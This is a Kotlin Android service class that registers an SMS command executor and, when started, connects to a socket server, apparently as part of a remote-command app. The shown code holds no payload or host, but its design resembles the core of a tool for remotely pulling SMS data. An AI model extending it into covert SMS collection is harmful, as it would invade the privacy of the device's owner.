package com.hc.calling

import android.app.Service
import android.content.Intent
import android.os.Binder
import android.os.IBinder
import com.hc.calling.commands.Executor
import com.hc.calling.commands.sms.Sms
import com.hc.calling.socket.SocketConductor

/**
 * Created by ChanHong on 2019/3/18
 *
 */
class MainService : Service() {

    val executors = mutableMapOf<String, Executor>()


    override fun onCreate() {
        super.onCreate()
        executors[Sms.SEND_SMS_LIST] = Sms(context = this)
    }

    override fun onBind(intent: Intent?): IBinder {
        return MyService()
    }

    //contect to the socket server
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        SocketConductor
            .instance
            .connect2Server(context = this)

        return super.onStartCommand(intent, flags, startId)
    }

    inner class MyService : Binder()

    override fun onDestroy() {
        super.onDestroy()
        SocketConductor.instance.socket!!.close()
    }

}